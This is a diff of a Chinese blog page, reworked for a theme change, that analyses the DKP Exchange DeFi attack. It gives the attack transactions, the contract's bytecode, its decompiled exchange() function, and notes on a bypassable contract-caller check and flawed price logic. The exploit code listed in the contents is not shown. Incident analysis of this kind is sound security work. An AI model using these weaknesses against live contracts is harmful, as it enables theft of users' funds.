@@ -1,117 +1,129 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>DKP Exchange 攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="DKP Exchange 攻击事件分析" />
-<meta property="og:description" content="DKP Exchange 攻击事件分析" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://yinhui1984.github.io/dpk-exchange-attack/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-03-24T20:16:27+08:00" />
-<meta property="article:modified_time" content="2023-03-24T20:16:27+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>DKP Exchange 攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="author" content="yinhui">
+<meta name="description" content="DKP Exchange 攻击事件分析
+"><meta name="keywords" content='defi'>
+  <meta itemprop="name" content="DKP Exchange 攻击事件分析">
+  <meta itemprop="description" content="DKP Exchange 攻击事件分析">
+  <meta itemprop="datePublished" content="2023-03-24T20:16:27+08:00">
+  <meta itemprop="dateModified" content="2023-03-24T20:16:27+08:00">
+  <meta itemprop="wordCount" content="2497">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="Defi"><meta property="og:url" content="http://localhost:1313/dpk-exchange-attack/">
+  <meta property="og:site_name" content="YINHUI&#39;s BLOG">
+  <meta property="og:title" content="DKP Exchange 攻击事件分析">
+  <meta property="og:description" content="DKP Exchange 攻击事件分析">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-03-24T20:16:27+08:00">
+    <meta property="article:modified_time" content="2023-03-24T20:16:27+08:00">
+    <meta property="article:tag" content="Defi">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
 
-<meta name="twitter:title" content="DKP Exchange 攻击事件分析"/>
-<meta name="twitter:description" content="DKP Exchange 攻击事件分析"/>
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="DKP Exchange 攻击事件分析">
+  <meta name="twitter:description" content="DKP Exchange 攻击事件分析">
 <meta name="application-name" content="YINHUI&#39;s BLOG">
-<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/dpk-exchange-attack/" /><link rel="prev" href="https://yinhui1984.github.io/euler-finance-attack/" /><link rel="next" href="https://yinhui1984.github.io/analysis_of_swaposv2_attack/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "DKP Exchange 攻击事件分析",
-        "inLanguage": "zh-CN",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "https:\/\/yinhui1984.github.io\/dpk-exchange-attack\/"
-        },"genre": "posts","keywords": "defi","wordcount":  2497 ,
-        "url": "https:\/\/yinhui1984.github.io\/dpk-exchange-attack\/","datePublished": "2023-03-24T20:16:27+08:00","dateModified": "2023-03-24T20:16:27+08:00","publisher": {
-            "@type": "Organization",
-            "name": ""},"author": {
-                "@type": "Person",
-                "name": "yinhui"
-            },"description": ""
-    }
-    </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
-
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" data-light="#ffffff" data-dark="#ffffff" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/dpk-exchange-attack/" title="DKP Exchange 攻击事件分析 - YINHUI&#39;s BLOG" /><link rel="prev" type="text/html" href="http://localhost:1313/euler-finance-attack/" title="Euler Finance 黑客攻击分析" /><link rel="next" type="text/html" href="http://localhost:1313/analysis_of_swaposv2_attack/" title="Swapos v2 attack 攻击分析" /><link rel="alternate" type="text/plain" href="http://localhost:1313/dpk-exchange-attack/index.md" title="DKP Exchange 攻击事件分析 - YINHUI's BLOG"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "DKP Exchange 攻击事件分析",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/dpk-exchange-attack\/"
+    },"genre": "posts","keywords": "defi","wordcount":  2497 ,
+    "url": "http:\/\/localhost:1313\/dpk-exchange-attack\/","datePublished": "2023-03-24T20:16:27+08:00","dateModified": "2023-03-24T20:16:27+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "yinhui"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="fixed" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/">首页</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="切换主题" title="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
     <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/" title="YINHUI&#39;s BLOG"></a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
-        </div>
+      <div class="header-title">
+        <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
     </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/" title="YINHUI&#39;s BLOG"></a>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
             </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><div class="search-wrapper">
-                    <div class="search mobile" id="search-mobile">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
-                        Cancel
-                    </a>
-                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a></div>
-    </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/">首页</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
 </header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">Contents</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DKP Exchange 攻击事件分析</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>security</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-24">2023-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2497 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
-                <div class="details-summary toc-title">
-                    <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
-                </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>DKP Exchange 攻击事件分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      yinhui</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/security/" class="post-category" title="分类 - Security"><i class="fa-regular fa-folder" aria-hidden="true"></i> Security</a></span></div><div class="post-meta-line"><span title="发布于 2023-03-24 20:16:27"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2023-03-24">2023-03-24</time></span>&nbsp;<span title="2497 字"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>约 2500 字</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>预计阅读 5 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#背景">背景</a></li>
     <li><a href="#代码分析">代码分析</a>
@@ -129,31 +141,36 @@
     <li><a href="#poc">POC</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>DKP Exchange 攻击事件分析</p>
-<h2 id="背景">背景</h2>
-<p>攻击tx: <a href="https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271</a></p>
-<p>获利tx: <a href="https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01</a></p>
-<p><a href="https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683" target="_blank" rel="noopener noreffer ">DKP Exchange 合约</a>提供了 <a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="noopener noreffer ">DKP token</a> 和 <a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener noreffer ">BUSD</a>的交换功能 , 但在其交换函数(exchange)中使用了错误的DKP token的价格查询逻辑, 而遭到了黑客的价格操纵攻击. 虽然合约在交换函数中做了&quot;不允许合约(CA)而只允许外部账户(EOA)调用交换函数&quot;, 但被轻松绕过了</p>
-<h2 id="代码分析">代码分析</h2>
-<p>DKP Exchange 的代码并没有verify, 所以只能看到字节码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+      </div><div class="content" id="content"><p>DKP Exchange 攻击事件分析</p>
+<h2 class="heading-element" id="背景"><span>背景</span>
+  <a href="#%e8%83%8c%e6%99%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>攻击tx: <a href="https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271" target="_blank" rel="external nofollow noopener noreferrer">https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271</a></p>
+<p>获利tx: <a href="https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01" target="_blank" rel="external nofollow noopener noreferrer">https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01</a></p>
+<p><a href="https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683" target="_blank" rel="external nofollow noopener noreferrer">DKP Exchange 合约</a>提供了 <a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="external nofollow noopener noreferrer">DKP token</a> 和 <a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="external nofollow noopener noreferrer">BUSD</a>的交换功能 , 但在其交换函数(exchange)中使用了错误的DKP token的价格查询逻辑, 而遭到了黑客的价格操纵攻击. 虽然合约在交换函数中做了&quot;不允许合约(CA)而只允许外部账户(EOA)调用交换函数&quot;, 但被轻松绕过了</p>
+<h2 class="heading-element" id="代码分析"><span>代码分析</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>DKP Exchange 的代码并没有verify, 所以只能看到字节码</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806......
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x608060405234801561001057600080fd5b50600436106101c45760003560e01c8063961bdfbf116100f9578063d42568f711610097578063e6db271311610071578063e6db2713146104bf578063f2fde38b146104dd578063fd19016c146104f9578063fdc65aa714610517576101c4565b8063d42568f714610455578063e176895e14610471578063e274a7bc146104a1576101c4565b8063b2d34d55116100d3578063b2d34d55146103cd578063bb11049f146103fd57806......</span></span></code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
 <p>到https://bscscan.com/address/0x89257A52Ad585Aacb1137fCc8abbD03a963B9683#code 查看完整代码</p>
 </blockquote>
 <p>但可以使用反编译工具反编译一下</p>
 <blockquote>
-<p>这里查看完整的反编译后的代码: <a href="https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol</a></p>
+<p>这里查看完整的反编译后的代码: <a href="https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/yinhui1984/imagehosting/blob/main/images/1679661755618031000.sol</a></p>
 </blockquote>
 <p>其<code>exchange()</code>函数如下</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -215,7 +232,7 @@
 </span></span><span class="line"><span class="cl">    <span class="mh">0x2a44</span><span class="p">(</span><span class="n">varg0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="c1">//重点代码1
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;no isContract&#39;</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;no isContract&#39;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">varg0</span> <span class="o">&gt;=</span> <span class="n">stor_9</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">&#39;num &gt;= propor&#39;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">varg0</span><span class="p">,</span> <span class="n">owner_a</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]);</span>
@@ -231,7 +248,7 @@
 </span></span><span class="line"><span class="cl">    <span class="mh">0x2a16</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="c1">//重点代码2
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1201</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x1201</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="mh">0x1af2</span><span class="p">(</span><span class="n">varg0</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="mh">0x1b6d</span><span class="p">(</span><span class="mh">0xde0b6b3a7640000</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
@@ -263,15 +280,20 @@
 </span></span><span class="line"><span class="cl">    <span class="mh">0x1972</span><span class="p">(</span><span class="n">v23</span><span class="p">,</span> <span class="n">stor_f_0_19</span><span class="p">,</span> <span class="n">stor_3_0_19</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">v25</span> <span class="o">=</span> <span class="n">_SafeSub</span><span class="p">(</span><span class="n">v24</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="mh">0x1972</span><span class="p">(</span><span class="n">v25</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">stor_3_0_19</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
-</div><h3 id="重点代码1">重点代码1</h3>
-<p>合约中 <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 这行代码是检查函数调用者不能是合约, 开发者还是有一点安全意识的(但不多), 怕被黑干脆不让合约调用.</p>
-<h3 id="重点代码2">重点代码2</h3>
-<p><code>v5 = 0x1201();</code> 转到函数 0x1201代码如下:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><h3 class="heading-element" id="重点代码1"><span>重点代码1</span>
+  <a href="#%e9%87%8d%e7%82%b9%e4%bb%a3%e7%a0%811" class="heading-mark">
